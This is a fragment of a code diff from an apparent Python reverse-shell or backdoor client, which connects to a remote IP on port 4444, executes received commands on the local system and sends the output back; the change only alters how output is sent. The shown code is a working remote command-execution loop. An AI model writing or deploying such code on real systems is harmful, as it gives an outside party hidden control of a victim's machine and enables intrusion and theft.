@@ -16,6 +16,6 @@ connection.connect((ip,4444))
 while True:
     recieved_data = connection.recv(1024)
     command = exe_sys_command(recieved_data.decode())
-    connection.send(command + "\n\n".encode())
+    connection.send(command)
 
 connection.close()
